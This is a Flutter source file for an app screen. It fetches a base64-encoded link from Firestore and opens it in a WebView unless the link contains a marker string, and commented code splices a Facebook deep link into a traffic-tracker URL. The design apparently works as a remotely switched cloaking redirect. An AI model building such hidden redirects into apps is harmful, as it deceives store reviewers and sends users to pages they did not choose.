import 'dart:convert';
import 'dart:io';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:facebook_deeplinks/facebook_deeplinks.dart';
import 'package:flutter/material.dart';
import 'package:pic_load/screens/content/content_screen.dart';
import 'package:pic_load/screens/webView/webView_screen.dart';
import 'package:shared_preferences/shared_preferences.dart';

class DownloadScreen extends StatefulWidget {
  const DownloadScreen({Key key}) :super(key: key);

  @override
  _DownloadScreenState createState() => _DownloadScreenState();
}

class _DownloadScreenState extends State<DownloadScreen> {
  bool checkValue = false;
  var facebookDeepLinks = FacebookDeeplinks();
  String deepLinkUrl;
  Future<SharedPreferences> prefs = SharedPreferences.getInstance();

  @override
  Widget build(BuildContext context) {
    return Scaffold(body: Center(child: CircularProgressIndicator(),));
  }

  @override
  void initState(){
    _storeDeepLink();
    super.initState();
    asyncInitState();
  }

  void asyncInitState() async{
    String isLink = await getDeepLink();
      print('Link from INIT: $isLink');
      if(isLink.isEmpty){
        linkFireStore();
      }else {
        Navigator.push(context, MaterialPageRoute(builder: (context) {
          return WebViewScreen(
              link: "https://yandex.ru");
        }));
      }
  }

  void linkFireStore() async{
    DocumentSnapshot ds = await FirebaseFirestore.instance
        .collection("test")
        .doc("3BpleA1QXmXFjIbjNvtB")
        .get();
    Map event = ds.data();
    print("Link: ${event['link']}");
    String link = event['link'];
    if(link.isEmpty || link == null){
      Navigator.push(
          context, MaterialPageRoute(builder: (context) => ContentScreen()));
    }
    String decodeLink = utf8.decode(base64.decode(event['link']));
    if(decodeLink.contains("aod7dzh1gvp16g85bxet")) {
      Navigator.push(
          context, MaterialPageRoute(builder: (context) => ContentScreen()));
    }else{
      Navigator.push(context, MaterialPageRoute(builder: (context) => WebViewScreen(link: decodeLink)));
    }
  }

  void _storeDeepLink() async{
    SharedPreferences pref = await SharedPreferences.getInstance();
    deepLinkUrl = await facebookDeepLinks.getInitialUrl();
    if(deepLinkUrl != null){
      pref.setString("deepLink", deepLinkUrl);
      print("Link: $deepLinkUrl");
    }
    print('DeepLink: $deepLinkUrl');
  }

  Future<String> getDeepLink() async{
    SharedPreferences sharedPreferences = await prefs;
    print("Get in Store: ${sharedPreferences.getString("deepLink")}");
    return sharedPreferences.getString("deepLink") ?? '';
  }
}


// class DownloadScreen extends StatefulWidget {
//   const DownloadScreen({Key key}) : super(key: key);
//
//   @override
//   _DownloadScreen createState() => _DownloadScreen();
// }
//
// class _DownloadScreen extends State<DownloadScreen> {
//   String deepLinkUrl;
//   String link;
//   // String decLink;
//   bool isLink = false;
//   Map<String, dynamic> data;
//   final fireStoreInstance = FirebaseFirestore.instance;
//   Future<SharedPreferences>_prefs = SharedPreferences.getInstance();
//   String _link;
//   SharedPreferences sharedPreferences;
//   bool checkValue = false;
//
//
//   @override
//   Widget build(BuildContext context) {
//     return Scaffold(
//       body: Center(
//         child: Column(
//           mainAxisAlignment: MainAxisAlignment.center,
//           crossAxisAlignment: CrossAxisAlignment.center,
//           children: [
//             Center(
//               child: CircularProgressIndicator(),
//             )
//           ],
//         ),
//       )
//     );
//   }
//
//   Future<void> deepLink() async{
//     //Facebook DeepLink
//     var facebookDeepLinks = FacebookDeeplinks();
//     // facebookDeepLinks.onDeeplinkReceived.listen(_onRedirected);
//     deepLinkUrl = await facebookDeepLinks.getInitialUrl();
//
//     if(deepLinkUrl != null) {
//       sharedPreferences.setBool("check", true);
//       sharedPreferences = await SharedPreferences.getInstance();
//       sharedPreferences.setString("deepLink", deepLinkUrl);
//     }
//     print("DeepLink: $deepLinkUrl ");
//
//     if (!mounted) return;
//
//     // _onRedirected(deepLinkUrl);
//   }
//
//   // getValue() async{
//   //   SharedPreferences prefs = await SharedPreferences.getInstance();
//   //   String stringValue = prefs.getString('deepLink');
//   //   return stringValue;
//   // }
//
//   // Future<void> getLink() async{
//   //     String value = await getValue() ?? '';
//   //   //Cloud Firestore
//   //   DocumentSnapshot ds = await FirebaseFirestore.instance
//   //       .collection("test")
//   //       .doc("3BpleA1QXmXFjIbjNvtB")
//   //       .get();
//   //   Map event = ds.data();
//   //   print(event['enLink']);
//   //   if(event['enLink'] == null){
//   //     Navigator.push(context, MaterialPageRoute(builder: (context) => ContentScreen()));
//   //   }else {
//   //     //deepLinkUrl == null
//   //     if(value.isEmpty || deepLinkUrl == null) {
//   //       Navigator.push(context, MaterialPageRoute(
//   //           builder: (context) => WebViewScreen(link: utf8.decode(base64.decode(event['enLink'])))));
//   //     }else {
//   //       //'https://mytraffictracker.com/click.php?key=uu123'
//   //       String link = utf8.decode(base64.decode(event['enLink']));
//   //       String deepNewLink = link.substring(0, link.indexOf('key')) +
//   //           value.substring(6);
//   //       Navigator.push(context, MaterialPageRoute(
//   //           builder: (context) => WebViewScreen(link: deepNewLink)));
//   //     }
//   //   }
//   // }
//
//   // void _onRedirected(String uri) {
//   //   setState(() {
//   //     _deepLink = uri;
//   //   });
//   // }
//
//   getLinks() async{
//     final SharedPreferences prefs = await _prefs;
//     setState(() {
//       checkValue = prefs.getBool("check");
//       if(checkValue != null){
//         if(checkValue){
//           _link = prefs.getString("deepLink");
//         }else{
//
//         }
//       }else{
//         checkValue = false;
//       }
//     });
//   }
//
//   // Future<void> linkDeep() async{
//   //   final SharedPreferences prefs = await _prefs;
//   //   final String link = (prefs.getString("deepLink") ?? '');
//   //
//   //   setState(() {
//   //     _link = prefs.setString("deepLink", link).then((bool success) {
//   //       return link;
//   //     });
//   //   });
//   // }
//
//   @override
//   void initState() {
//     super.initState();
//     // _link = _prefs.then((SharedPreferences pref)  {
//     //   return (pref.getString("deepLink") ?? '');
//     // });
//
//     // deepLink();
//     // sleep(Duration(seconds: 1));
//     // getLink();
//   }
//
//   @override
//   void dispose() {
//     super.dispose();
//   }
// }
